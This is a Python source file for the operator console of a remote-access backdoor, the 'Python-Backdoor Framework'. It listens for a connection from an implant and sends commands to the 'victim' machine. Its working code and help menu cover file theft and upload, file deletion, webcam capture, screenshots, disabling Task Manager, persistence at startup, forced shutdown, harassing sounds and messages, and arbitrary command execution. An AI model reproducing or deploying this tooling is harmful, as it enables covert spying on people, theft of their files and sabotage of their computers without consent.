import os
import json
import socket
import base64
import task_manager as tm
from colorama import init, Fore

#JSON - Way of converting objects to strings
class server_backdoor:
    required_arguments = ["download", "troll", "upload", "launch", "del", "read", "psound", "sdmsg", "cgstate"]

    TROLL_PATH = os.getcwd() +  "\Backdoor\SFX\\"
    HACKED_SFX = TROLL_PATH + "CrazyLaugh.wav"
    TROLL_SFX = TROLL_PATH + "RunningAway.wav"
    
    screenshot_counter = 1
    webcam_counter = 1

    def __init__(self, ip, port):
        try:
            self.show_painting()

            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        #Address family, Socket type 
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)      #Allows us to reuse sockets, so in case our connection drops, we can establish a new one.
            listener.bind((ip, port))
            listener.listen(0)      #Number of connections, before the system starts to refuse connections

            print("{}[+] Waiting for connections.{}".format(Fore.CYAN, Fore.WHITE))
            self.connection, address = listener.accept()
            print("{}[+] Got a connection from {}{}".format(Fore.GREEN, address, Fore.WHITE))
        except socket.error as e:
            print("Error connecting: {}".format(e))

    def show_painting(self):
        try:
            init()      #Initializing colorama            
            print("""\t{}______            _       _                  
        | ___ \          | |     | |
        | |_/ / __ _  ___| | ____| | ___   ___  _ __ 
        | ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \| '__|
        | |_/ / (_| | (__|   < (_| | (_) | (_) | |   
        \____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                                (Python-Backdoor Framework)

                                Vesion 1.2
                                Github: https://github.com/NoamHarush/                                
                                                        {}\n\n""".format(Fore.BLUE, Fore.WHITE))
                
        except Exception as e:
            return "[-] Couldn't show the starting painting: {}".format(e)

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode())
        except Exception as e:
            return "[-] (Server) Couldn't send the data, {}.".format(e)

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:      #We need to receive more data
                continue
            except Exception as e:
                return "[-] (Server) Couldn't receive the data, {}.".format(e)

    def execute_remotely(self, command):
        try:
            self.reliable_send(command)    
            if str(command[0]).lower() == "exit" or self.is_a_shutdown_type(command):
                self.connection.close()
                exit()
    
            return self.reliable_receive()
        except Exception as e:
            return "[-] (Server) Couldn't send/receive the data: {}.".format(e)

    def is_a_shutdown_type(self, command):
        return (command[0] == "cgstate" and command[1] == "2") or (command[0] == "cgstate" and command[1] == "3")

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "[+] Successfuly downloaded to: {}.".format(path)   
        except Exception as e:
            return "[-] (Server) Couldn't write to: {}, {}.".format(path, e)

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except Exception as e:
            return "[-] (Server) Couldn't extract data from: {}, {}.".format(path, e)

    def write_webcam_snap(self, data):
        try:
            file_name = "\\WebcamSnap{}.png".format(self.webcam_counter)
            self.webcam_counter += 1
            
            path = os.getcwd() + file_name       
            self.write_file(path, data)

            return "[+] Successfully managed to download and save the camera snap at: {}.".format(path)
        except Exception as e:
            return "[-] Error while trying to save the saved camera snap: {}.".format(e)

    def write_screenshot(self, data):
        try:            
            file_name = "\\Screenshot{}.png".format(self.screenshot_counter)
            self.screenshot_counter += 1

            path = os.getcwd() + file_name
            self.write_file(path, data)          

            return "[+] Successfully managed to download and save the screenshot at: {}.".format(path)
        except Exception as e:
            return "[-] Error during download of the screenshot: {}.".format(e)

    def is_valid(self, cmd_0, rest_of_command):
        #We are checking if the user wrote a command that requires an argument and if he really provided one 
        for i in self.required_arguments:
            if cmd_0 == i:
                if len(rest_of_command) == 0:
                    return False
        
        return True 

    def help_menu(self):
        print("\nCore Commands\n=============\n")
        print("Command\t\tDescription\n-------\t\t-----------")
        print("{}\t\t{}".format("help", "Show help menu."))
        print("{}\t{}".format("download path", "Download a file (to the project's directory)."))
        print("{}\t{}".format("upload -p path -t target", "Upload a file."))
        print("{}\t\t{}".format("startup", "Add the program to Startup."))
        print("{}\t{}".format("rmstartup", "Remove the program from Startup."))
        print("{}\t\t{}".format("exit", "Exit the program."))

        print("\nFile Commands\n=============\n")
        print("Command\t\tDescription\n-------\t\t-----------")
        print("{}\t{}".format("launch path", "Launch a file."))
        print("{}\t{}".format("del path", "Delete a file/folder."))
        print("{}\t{}".format("read path", "Read a file's content."))
        print("{}\t{}".format("psound path", "Play a sound."))
        print("{}\t\t{}".format("stsound", "Stop the playing sound."))

        print("\nSpying\n======\n")
        print("Command\t\tDescription\n-------\t\t-----------")
        print("{}\t\t{}".format("webcam", "Get a snap of the webcam."))
        print("{}\t{}".format("screenshot", "Take a screenshot."))

        print("\nComputer Information\n====================\n")
        print("Command\t\tDescription\n-------\t\t-----------")
        print("{}\t\t{}".format("idle", "Get idle time."))
        print("{}\t\t{}".format("info", "Get Info about the user."))
        print("{}\t\t{}".format("user", "Get current user."))
        print("{}\t\t{}".format("ps", "Display all the processes running."))

        print("\nOther Commands\n=============\n")
        print("Command\t\tDescription\n-------\t\t-----------")
        print("{}\t{}".format("tsmanager", "Disable/Enable the Task Manager."))
        print("{}\t{}".format("sdmsg msg", "Send a message to the user."))
        print("{}\t{}".format("cgstate 1", "Lock the system."))
        print("{}\t{}".format("cgstate 2", "Restart the system."))
        print("{}\t{}".format("cgstate 3", "Shut down the system."))
        print("{}\t\t{}".format("troll 1", "Make the user realize he has been hacked."))
        print("{}\t\t{}".format("troll 2", "Troll the user by random messages and sfx."))
        print("\nYou can execute any cmd command.\n")

    def run(self):
        self.help_menu()
        while True:
            command = input(">> ")
            command = command.split(" ")
            command_0 = command[0].lower()
            
            try:
                rest_of_command = " ".join(command[1:])
                if self.is_valid(command_0, rest_of_command):
                    if command_0 == "help":
                        self.help_menu()
                        continue
                    elif command_0 == "upload":
                        p_index = command.index("-p")
                        t_index = command.index("-t")
                        file_path = " ".join(command[p_index + 1: t_index])     #Getting the file we want to upload location

                        file_content = self.read_file(file_path)
                        command.append(file_content)
                    elif command_0 == "troll":
                        if rest_of_command != "1" and rest_of_command != "2":
                            print("[-] (Server) no such parameters for troll.")
                            continue
                        else:
                            if rest_of_command == "1":   #Hacked version
                                if os.path.exists(self.HACKED_SFX) and os.path.isfile(self.HACKED_SFX):
                                    print("[+] Uploading necessary files to the victim's system.")
                                    
                                    sfx_content = self.read_file(self.HACKED_SFX)
                                    command.append(sfx_content)
                                else:
                                    print("[-] You are missing HackingSFX.")
                                    continue
                            elif rest_of_command == "2":     #Troll version
                                if os.path.exists(self.TROLL_SFX) and os.path.isfile(self.TROLL_SFX):
                                    print("[+] Uploading necessary files to the victim's system.")

                                    sfx_content = self.read_file(self.TROLL_SFX)
                                    command.append(sfx_content)
                                else:
                                    print("[-] You are missing TrollSFX.")
                                    continue

                    result = self.execute_remotely(command)
                    if "[-]" not in result:                        
                        if command_0 == "download":
                            path = os.getcwd() + "\\" + rest_of_command
                            result = self.write_file(path, result)
                        elif command_0 == "screenshot":
                            result = self.write_screenshot(result)
                        elif command_0 == "webcam":
                            result = self.write_webcam_snap(result)
                else:
                    result = "[-] (Server) You wrote incorrectly the command, for help write help."                    
            except Exception as e:
                result = "\n[-] (Server) Error during command execution: {}.".format(e)
 
            print(result)

server = server_backdoor("192.168.1.107", 4040)
server.run()